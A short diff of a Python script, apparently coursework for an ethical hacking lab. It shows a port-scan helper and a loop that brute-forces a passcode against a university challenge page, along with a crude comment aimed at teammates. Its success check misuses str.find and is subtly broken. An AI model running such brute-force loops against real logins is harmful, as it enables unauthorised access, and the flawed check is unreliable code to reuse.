@@ -27,7 +27,7 @@ def scanport(host, port):
     return True
 
 
-# Still a bit buggy, needs a bit of tweaking........
+# I think this is completely working but cannot check until you fuckers finish the rest -joe
 
 def crackhouse():
     """Bruteforce the password for titanium house"""
@@ -37,11 +37,10 @@ def crackhouse():
         r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php",
                          params = params)
         if r.text.find("incorrect"):
-            print "Fails on {0}".format(item)
+            print("Fails on {0}".format(item))
         else:
-            print "Passcode {0} Ok".format(item)
+            print("Passcode {0} Ok".format(item))
             return item
-
 
 
 # Something eye catching/fun but in the same time usable would be perfect here. (CowSay?)
